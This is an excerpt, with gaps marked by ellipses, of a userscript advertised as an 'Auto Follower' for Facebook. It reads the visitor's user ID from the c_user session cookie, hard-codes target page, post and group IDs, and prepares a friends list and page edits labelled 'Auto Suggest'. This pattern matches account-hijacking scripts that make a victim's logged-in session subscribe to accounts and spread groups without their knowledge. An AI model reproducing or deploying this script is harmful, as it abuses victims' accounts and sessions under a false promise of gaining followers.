// ==UserScript==
// @name            Auto Follower *NEW 50K*
// @description    Auto Follower by Syazman Saikou asdasafafsa@yahoo.com
...
sublist("566178480093025");

var gid = ['102069946670664'];
...
var spage_id = "176494099114429";
var spost_id = "176494099114429";
var sfoto_id = "176494099114429";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Syazman Saikou';
